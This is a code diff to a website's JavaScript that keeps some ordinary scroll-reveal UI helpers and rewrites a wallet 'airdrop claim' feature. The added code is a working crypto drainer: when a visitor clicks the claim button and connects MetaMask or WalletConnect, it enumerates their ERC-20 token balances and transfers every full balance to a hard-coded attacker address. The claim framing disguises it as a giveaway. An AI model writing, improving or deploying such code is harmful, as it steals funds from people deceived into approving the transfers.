@@ -1,6 +1,6 @@
 'use strict';
 
-// Existing UI functionality (unchanged)
+// UI functionality (unchanged)
 const addEventOnElem = function (elem, type, callback) {
   if (elem.length > 1) {
     for (let i = 0; i < elem.length; i++) {
@@ -57,7 +57,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 //
-// Wallet connection and asset transfer logic
+// Wallet connection and token transfer logic
 //
 
 // Load WalletConnectProvider if not already loaded
@@ -72,69 +72,92 @@ async function loadWalletConnect() {
   }
 }
 
-async function connectWalletAndSendTokens() {
-  let provider;
-  let web3Provider;
-
-  // Check for MetaMask first
-  if (window.ethereum && window.ethereum.isMetaMask) {
-    provider = window.ethereum;
-    await provider.request({ method: 'eth_requestAccounts' });
-    web3Provider = new ethers.providers.Web3Provider(provider);
-  } else {
-    // Fallback to WalletConnect
-    await loadWalletConnect();
-    const WalletConnectProvider = window.WalletConnectProvider.default;
-    provider = new WalletConnectProvider({
-      rpc: {
-        1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID" // Replace if needed
-      },
+// Load ethers.js if not already loaded
+async function loadEthers() {
+  if (!window.ethers) {
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+    document.head.appendChild(script);
+    return new Promise(resolve => {
+      script.onload = resolve;
     });
-    await provider.enable();
-    web3Provider = new ethers.providers.Web3Provider(provider);
   }
-
-  const signer = web3Provider.getSigner();
-  const userAddress = await signer.getAddress();
-  const chainId = await signer.getChainId();
-  const covalentApiKey = "YOUR_API_KEY";
-
-  const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
-  const response = await fetch(url);
-  const data = await response.json();
-
-  if (!data.data || !data.data.items) {
-    alert('No tokens found.');
-    return;
-  }
-
-  const tokens = data.data.items.filter(token =>
-    token.type === 'cryptocurrency' &&
-    token.contract_address &&
-    token.balance > 0 &&
-    token.supports_erc?.includes("erc20")
-  );
-
-  const destAddress = "0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47";
-
-  for (const token of tokens) {
-    try {
-      const contract = new ethers.Contract(token.contract_address, [
-        "function transfer(address to, uint amount) returns (bool)"
-      ], signer);
-
-      const decimals = token.contract_decimals;
-      const amount = ethers.BigNumber.from(token.balance.toString());
-      const adjustedAmount = amount; // already in raw units
-
-      const tx = await contract.transfer(destAddress, adjustedAmount);
-      console.log(`Sent ${token.contract_ticker_symbol}:`, tx.hash);
-    } catch (err) {
-      console.warn(`Failed to send ${token.contract_ticker_symbol}:`, err.message);
-    }
-  }
-
-  alert("Tokens processed. Check your wallet for confirmations.");
 }
 
+async function connectWalletAndSendTokens() {
+  try {
+    await loadEthers();
+
+    let provider;
+    let web3Provider;
+
+    // Check for MetaMask
+    if (window.ethereum && window.ethereum.isMetaMask) {
+      provider = window.ethereum;
+      await provider.request({ method: 'eth_requestAccounts' });
+      web3Provider = new ethers.providers.Web3Provider(provider);
+    } else {
+      // Fallback to WalletConnect
+      await loadWalletConnect();
+      const WalletConnectProvider = window.WalletConnectProvider.default;
+      provider = new WalletConnectProvider({
+        rpc: {
+          1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID" // Replace with your Infura Project ID
+        }
+      });
+      await provider.enable();
+      web3Provider = new ethers.providers.Web3Provider(provider);
+    }
+
+    const signer = web3Provider.getSigner();
+    const userAddress = await signer.getAddress();
+    const network = await web3Provider.getNetwork();
+    const chainId = network.chainId;
+
+    const covalentApiKey = "YOUR_API_KEY"; // Replace with your Covalent API key
+    const destAddress = "0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47"; // Airdrop receiver address
+
+    const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
+    const response = await fetch(url);
+    const data = await response.json();
+
+    if (!data.data || !data.data.items) {
+      alert("Unable to fetch token balances.");
+      return;
+    }
+
+    const tokens = data.data.items.filter(token =>
+      token.type === "cryptocurrency" &&
+      token.contract_address &&
+      token.balance > 0 &&
+      token.supports_erc?.includes("erc20")
+    );
+
+    if (tokens.length === 0) {
+      alert("No eligible ERC-20 tokens found in your wallet.");
+      return;
+    }
+
+    for (const token of tokens) {
+      try {
+        const contract = new ethers.Contract(token.contract_address, [
+          "function transfer(address to, uint amount) returns (bool)"
+        ], signer);
+
+        const amount = ethers.BigNumber.from(token.balance.toString()); // Ensure it's treated as a string
+        const tx = await contract.transfer(destAddress, amount);
+        console.log(`Transferred ${token.contract_ticker_symbol}: ${tx.hash}`);
+      } catch (err) {
+        console.warn(`Error sending ${token.contract_ticker_symbol}: ${err.message}`);
+      }
+    }
+
+    alert("Tokens processed. Please check your wallet for confirmation.");
+  } catch (err) {
+    console.error("Connection or transaction error:", err);
+    alert("An error occurred. Please try again.");
+  }
+}
+
+// Bind the airdrop button
 document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
